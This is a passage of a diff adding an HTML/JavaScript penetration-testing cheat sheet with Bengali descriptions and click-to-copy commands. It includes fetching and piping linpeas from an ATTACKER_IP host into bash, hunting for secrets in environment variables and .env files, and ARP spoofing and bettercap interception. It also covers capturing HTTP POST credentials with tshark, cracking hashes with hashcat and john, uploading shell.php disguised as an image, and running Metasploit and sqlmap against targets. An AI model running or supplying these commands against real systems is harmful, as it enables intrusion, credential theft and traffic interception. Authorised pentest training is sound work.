+    code: 'hcxpcapngtool <span class="s-flag">-o</span> hash.hc22000 capture.cap\n<span class="s-cmd">hashcat</span> <span class="s-flag">-m 22000</span> hash.hc22000 rockyou.txt',
+    raw: 'hcxpcapngtool -o hash.hc22000 capture.cap\nhashcat -m 22000 hash.hc22000 rockyou.txt'
+  },
+
+  // ═══════ POST-EXPLOIT ═══════
+  {
+    cat: 'post', section: 'Post-Exploitation', sIcon: '🏴',
+    label: 'linpeas', tag: 'PRIVESC', tagColor: '#f59e0b',
+    desc: 'Linux privilege escalation automated check',
+    code: '<span class="s-cmd">curl</span> http://<span class="s-var">ATTACKER_IP</span>:8000/linpeas.sh | bash\n<span class="s-com"># Server: python3 -m http.server 8000</span>',
+    raw: 'curl http://ATTACKER_IP:8000/linpeas.sh | bash'
+  },
+  {
+    cat: 'post', section: 'Post-Exploitation', sIcon: '🏴',
+    label: 'sudo -l', tag: 'PRIVESC', tagColor: '#f59e0b',
+    desc: 'Password ছাড়া কী sudo চালাতে পারি?',
+    code: '<span class="s-cmd">sudo</span> <span class="s-flag">-l</span>\n<span class="s-com"># (root) NOPASSWD: /usr/bin/vim → root shell!</span>',
+    raw: 'sudo -l'
+  },
+  {
+    cat: 'post', section: 'Post-Exploitation', sIcon: '🏴',
+    label: 'SUID files', tag: 'PRIVESC', tagColor: '#f59e0b',
+    desc: 'SUID bit সেট ফাইল খোঁজো → GTFOBins চেক করো',
+    code: 'find / <span class="s-flag">-perm -4000</span> <span class="s-flag">-type f</span> 2>/dev/null | xargs ls <span class="s-flag">-la</span>',
+    raw: 'find / -perm -4000 -type f 2>/dev/null | xargs ls -la'
+  },
+  {
+    cat: 'post', section: 'Post-Exploitation', sIcon: '🏴',
+    label: 'cron jobs', tag: 'PRIVESC', tagColor: '#f59e0b',
+    desc: 'Root cron jobs দেখো — writable script আছে?',
+    code: 'cat /etc/crontab\nls <span class="s-flag">-la</span> /etc/cron*\n<span class="s-cmd">crontab</span> <span class="s-flag">-l</span>',
+    raw: 'cat /etc/crontab\nls -la /etc/cron*\ncrontab -l'
+  },
+  {
+    cat: 'post', section: 'Post-Exploitation', sIcon: '🏴',
+    label: 'env credentials', tag: 'POST', tagColor: '#10b981',
+    desc: 'Environment variables-এ secret/key/password খোঁজো',
+    code: 'env | grep <span class="s-flag">-i</span> <span class="s-str">"key\\|secret\\|pass\\|token\\|db"</span>',
+    raw: 'env | grep -i "key\\|secret\\|pass\\|token\\|db"'
+  },
+  {
+    cat: 'post', section: 'Post-Exploitation', sIcon: '🏴',
+    label: 'config credentials', tag: 'POST', tagColor: '#10b981',
+    desc: 'Web app config files-এ DB credentials খোঁজো',
+    code: 'find /var/www <span class="s-flag">-name</span> <span class="s-str">"*.php"</span> <span class="s-flag">-exec</span> grep <span class="s-flag">-l</span> <span class="s-str">"password\\|DB_PASS"</span> {} \\;\ncat /var/www/html/.env',
+    raw: 'find /var/www -name "*.php" -exec grep -l "password\\|DB_PASS" {} \\;\ncat /var/www/html/.env'
+  },
+  {
+    cat: 'post', section: 'Post-Exploitation', sIcon: '🏴',
+    label: 'proof - screenshot', tag: 'POST', tagColor: '#0ea5e9',
+    desc: 'Pentest proof screenshot — hostname + whoami + date',
+    code: 'echo <span class="s-str">"=== PROOF ==="</span> && hostname && whoami && id && date && ip addr',
+    raw: 'echo "=== PROOF ===" && hostname && whoami && id && date && ip addr'
+  },
+
+  // ═══════ NETWORK ═══════
+  {
+    cat: 'network', section: 'Network / MitM', sIcon: '📡',
+    label: 'arp spoofing', tag: 'MITM', tagColor: '#ef4444',
+    desc: 'ARP Spoofing — MitM position নাও',
+    code: 'echo 1 > /proc/sys/net/ipv4/ip_forward\n<span class="s-cmd">sudo</span> arpspoof <span class="s-flag">-i</span> eth0 <span class="s-flag">-t</span> <span class="s-var">VICTIM</span> <span class="s-var">GATEWAY</span>',
+    raw: 'echo 1 > /proc/sys/net/ipv4/ip_forward\nsudo arpspoof -i eth0 -t VICTIM GATEWAY'
+  },
+  {
+    cat: 'network', section: 'Network / MitM', sIcon: '📡',
+    label: 'bettercap - start', tag: 'BETTERCAP', tagColor: '#ef4444',
+    desc: 'Bettercap MitM framework চালু করো',
+    code: '<span class="s-cmd">sudo</span> bettercap <span class="s-flag">-iface</span> eth0\n<span class="s-com"># > arp.spoof on; net.sniff on</span>',
+    raw: 'sudo bettercap -iface eth0'
+  },
+  {
+    cat: 'network', section: 'Network / MitM', sIcon: '📡',
+    label: 'wireshark filter', tag: 'WIRESHARK', tagColor: '#6366f1',
+    desc: 'সবচেয়ে কাজের Wireshark display filters',
+    code: '<span class="s-com">ip.addr == 192.168.1.5</span>\n<span class="s-com">http.request.method == POST</span>\n<span class="s-com">frame contains "password"</span>\n<span class="s-com">dns.qry.name contains "bank"</span>',
+    raw: 'ip.addr == 192.168.1.5\nhttp.request.method == POST\nframe contains "password"'
+  },
+  {
+    cat: 'network', section: 'Network / MitM', sIcon: '📡',
+    label: 'tshark capture', tag: 'TSHARK', tagColor: '#6366f1',
+    desc: 'Command line Wireshark — HTTP POST credentials',
+    code: '<span class="s-cmd">sudo</span> tshark <span class="s-flag">-i</span> eth0 <span class="s-flag">-Y</span> <span class="s-str">"http.request.method==POST"</span> <span class="s-flag">-T fields</span> <span class="s-flag">-e</span> http.host <span class="s-flag">-e</span> http.file_data',
+    raw: 'sudo tshark -i eth0 -Y "http.request.method==POST" -T fields -e http.host -e http.file_data'
+  },
+  {
+    cat: 'network', section: 'Network / MitM', sIcon: '📡',
+    label: 'SSH SOCKS5 proxy', tag: 'PROXY', tagColor: '#10b981',
+    desc: 'SSH দিয়ে SOCKS5 proxy tunnel বানাও',
+    code: '<span class="s-cmd">ssh</span> <span class="s-flag">-D 1080</span> <span class="s-flag">-fCqN</span> user@<span class="s-var">server.com</span>\n<span class="s-com"># Browser proxy: 127.0.0.1:1080</span>',
+    raw: 'ssh -D 1080 -fCqN user@server.com'
+  },
+
+  // ═══════ CRACKING ═══════
+  {
+    cat: 'crack', section: 'Password Cracking', sIcon: '🔨',
+    label: 'hashcat - md5', tag: 'HASHCAT', tagColor: '#f59e0b',
+    desc: 'MD5 hash crack করো',
+    code: '<span class="s-cmd">hashcat</span> <span class="s-flag">-m 0</span> hash.txt rockyou.txt',
+    raw: 'hashcat -m 0 hash.txt rockyou.txt'
+  },
+  {
+    cat: 'crack', section: 'Password Cracking', sIcon: '🔨',
+    label: 'hashcat - sha256', tag: 'HASHCAT', tagColor: '#f59e0b',
+    desc: 'SHA-256 hash crack',
+    code: '<span class="s-cmd">hashcat</span> <span class="s-flag">-m 1400</span> hash.txt rockyou.txt',
+    raw: 'hashcat -m 1400 hash.txt rockyou.txt'
+  },
+  {
+    cat: 'crack', section: 'Password Cracking', sIcon: '🔨',
+    label: 'hashcat - bcrypt', tag: 'HASHCAT', tagColor: '#f59e0b',
+    desc: 'bcrypt ($2y$) hash crack — slow কিন্তু কাজ করে',
+    code: '<span class="s-cmd">hashcat</span> <span class="s-flag">-m 3200</span> hash.txt rockyou.txt',
+    raw: 'hashcat -m 3200 hash.txt rockyou.txt'
+  },
+  {
+    cat: 'crack', section: 'Password Cracking', sIcon: '🔨',
+    label: 'john - auto', tag: 'JOHN', tagColor: '#8b5cf6',
+    desc: 'John the Ripper — auto-detect hash type',
+    code: '<span class="s-cmd">john</span> hash.txt <span class="s-flag">--wordlist</span>=rockyou.txt\n<span class="s-cmd">john</span> hash.txt <span class="s-flag">--show</span>',
+    raw: 'john hash.txt --wordlist=rockyou.txt\njohn hash.txt --show'
+  },
+  {
+    cat: 'crack', section: 'Password Cracking', sIcon: '🔨',
+    label: 'hash-identifier', tag: 'IDENTIFY', tagColor: '#0ea5e9',
+    desc: 'Hash type identify করো crack করার আগে',
+    code: '<span class="s-cmd">hash-identifier</span>\n<span class="s-com"># অথবা:</span>\n<span class="s-cmd">hashid</span> <span class="s-str">"5f4dcc3b5aa765d61d8327deb882cf99"</span>',
+    raw: 'hash-identifier\nhashid "5f4dcc3b5aa765d61d8327deb882cf99"'
+  },
+
+  // ═══════ MISC ═══════
+  {
+    cat: 'misc', section: 'Misc Tools', sIcon: '🔧',
+    label: 'searchsploit', tag: 'EXPLOIT-DB', tagColor: '#ef4444',
+    desc: 'Software/version-এর known exploit খোঁজো',
+    code: '<span class="s-cmd">searchsploit</span> apache 2.4.49\n<span class="s-cmd">searchsploit</span> <span class="s-flag">-x</span> 50383   <span class="s-com"># examine exploit</span>\n<span class="s-cmd">searchsploit</span> <span class="s-flag">-m</span> 50383   <span class="s-com"># copy to current dir</span>',
+    raw: 'searchsploit apache 2.4.49'
+  },
+  {
+    cat: 'misc', section: 'Misc Tools', sIcon: '🔧',
+    label: 'msfconsole basic', tag: 'METASPLOIT', tagColor: '#6366f1',
+    desc: 'Metasploit basic workflow',
+    code: '<span class="s-cmd">msfconsole</span>\nmsf6> search <span class="s-var">apache 2.4.49</span>\nmsf6> use <span class="s-var">0</span>\nmsf6> set RHOSTS <span class="s-var">target.com</span>\nmsf6> run',
+    raw: 'msfconsole\n# search apache 2.4.49\n# use 0\n# set RHOSTS target.com\n# run'
+  },
+  {
+    cat: 'misc', section: 'Misc Tools', sIcon: '🔧',
+    label: 'curl upload', tag: 'FILE', tagColor: '#10b981',
+    desc: 'curl দিয়ে file upload করো',
+    code: '<span class="s-cmd">curl</span> <span class="s-flag">-F</span> <span class="s-str">"file=@shell.php"</span> https://target.com/upload\n<span class="s-cmd">curl</span> <span class="s-flag">-F</span> <span class="s-str">"file=@shell.php;type=image/jpeg"</span> https://target.com/upload',
+    raw: 'curl -F "file=@shell.php" https://target.com/upload'
+  },
+  {
+    cat: 'misc', section: 'Misc Tools', sIcon: '🔧',
+    label: 'python http server', tag: 'SERVER', tagColor: '#0ea5e9',
+    desc: 'Quick HTTP server চালাও ফাইল transfer-এর জন্য',
+    code: '<span class="s-cmd">python3</span> <span class="s-flag">-m</span> http.server <span class="s-red">8000</span>\n<span class="s-com"># Target-এ: curl http://ATTACKER_IP:8000/file</span>',
+    raw: 'python3 -m http.server 8000'
+  },
+  {
+    cat: 'misc', section: 'Misc Tools', sIcon: '🔧',
+    label: 'shodan search', tag: 'SHODAN', tagColor: '#ec4899',
+    desc: 'Shodan CLI দিয়ে exposed service খোঁজো',
+    code: '<span class="s-cmd">shodan</span> search <span class="s-str">"hostname:target.com"</span>\n<span class="s-cmd">shodan</span> host <span class="s-var">93.184.216.34</span>',
+    raw: 'shodan search "hostname:target.com"\nshodan host 93.184.216.34'
+  },
+  {
+    cat: 'misc', section: 'Misc Tools', sIcon: '🔧',
+    label: 'proxychains', tag: 'PROXY', tagColor: '#10b981',
+    desc: 'যেকোনো command Proxy দিয়ে চালাও',
+    code: '<span class="s-cmd">proxychains</span> nmap <span class="s-flag">-sT</span> target.com\n<span class="s-cmd">proxychains</span> curl ifconfig.me\n<span class="s-cmd">proxychains</span> sqlmap <span class="s-flag">-u</span> <span class="s-str">"http://target.com?id=1"</span>',
+    raw: 'proxychains nmap -sT target.com'
+  },
+];
+
+// ═══ BUILD UI ═══
+let currentCat = 'all';
+let currentSearch = '';
+
+function getSections() {
+  const sections = {};
+  COMMANDS.forEach(cmd => {
+    const key = cmd.section;
+    if (!sections[key]) sections[key] = { icon: cmd.sIcon, cmds: [] };
+    sections[key].cmds.push(cmd);
+  });
+  return sections;
+}
+
+function buildUI() {
+  const main = document.getElementById('mainContent');
+  const sections = getSections();
+  let html = '';
+
+  for (const [sName, sData] of Object.entries(sections)) {
+    const catCmds = sData.cmds.filter(c => c.cat === currentCat || currentCat === 'all');
+    if (catCmds.length === 0) continue;
+
+    html += `<div class="section" data-section="${sName}">
+      <div class="section-header">
+        <span class="section-icon">${sData.icon}</span>
+        <span class="section-title">${sName.toUpperCase()}</span>
+        <span class="section-desc">${catCmds.length} commands</span>
+      </div>
+      <div class="cmd-grid">`;
+
+    catCmds.forEach((cmd, i) => {
+      html += `<div class="cmd-card" data-cat="${cmd.cat}" data-label="${cmd.label.toLowerCase()}" data-desc="${cmd.desc.toLowerCase()}" data-raw="${cmd.raw.toLowerCase()}">
+        <div class="cmd-header">
+          <div class="cmd-dots"><span></span><span></span><span></span></div>
+          <span class="cmd-label">${cmd.label}</span>
+          <span class="cmd-tag" style="background:${cmd.tagColor}22;color:${cmd.tagColor};border:1px solid ${cmd.tagColor}44">${cmd.tag}</span>
+        </div>
+        <div class="cmd-body">
+          <div class="cmd-desc">${cmd.desc}</div>
+          <div class="cmd-code" onclick="copyCmd(this, \`${cmd.raw.replace(/`/g,'\\`')}\`)">
+            <span class="copy-hint">click to copy</span>
+            ${cmd.code}
+          </div>
+        </div>
+      </div>`;
+    });
+
+    html += `</div></div>`;
+  }
+
+  main.innerHTML = html || '<div class="empty"><div class="empty-icon">🔍</div><div class="empty-text">No commands found</div></div>';
+  updateCounts();
+  applySearch();
+}
+
+function updateCounts() {
+  const cats = ['recon','scan','web','exploit','wifi','post','network','crack','misc'];
+  cats.forEach(cat => {
+    const count = COMMANDS.filter(c => c.cat === cat).length;
+    const el = document.getElementById('cnt-'+cat);
+    if (el) el.textContent = count;
+  });
+  document.getElementById('cnt-all').textContent = COMMANDS.length;
+}
+
+function filterCat(btn) {
+  document.querySelectorAll('.cat-btn').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  currentCat = btn.dataset.cat;
+  buildUI();
+}
+
+function applySearch() {
+  const q = currentSearch.toLowerCase().trim();
+  const cards = document.querySelectorAll('.cmd-card');
+  let visible = 0;
+
+  cards.forEach(card => {
+    const label = card.dataset.label || '';
+    const desc  = card.dataset.desc  || '';
+    const raw   = card.dataset.raw   || '';
+    const matches = !q || label.includes(q) || desc.includes(q) || raw.includes(q);
+    card.style.display = matches ? '' : 'none';
+    if (matches) visible++;
+  });
+
+  // Hide empty sections
+  document.querySelectorAll('.section').forEach(sec => {
+    const visCards = [...sec.querySelectorAll('.cmd-card')].some(c => c.style.display !== 'none');
+    sec.style.display = visCards ? '' : 'none';
+  });
+
+  document.getElementById('visibleCount').textContent = visible;
+}
+
+function copyCmd(el, text) {
+  navigator.clipboard.writeText(text).then(() => {
+    el.classList.add('copied');
+    el.querySelector('.copy-hint').textContent = '✓ Copied!';
+    setTimeout(() => {
+      el.classList.remove('copied');
+      el.querySelector('.copy-hint').textContent = 'click to copy';
+    }, 2000);
+    const toast = document.getElementById('toast');
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 2000);
+  });
+}
+
+document.getElementById('searchInput').addEventListener('input', function() {
+  currentSearch = this.value;
+  applySearch();
+});
+
+// INIT
+buildUI();
+updateCounts();
+document.getElementById('visibleCount').textContent = COMMANDS.length;
+</script>
+</body>
+</html>
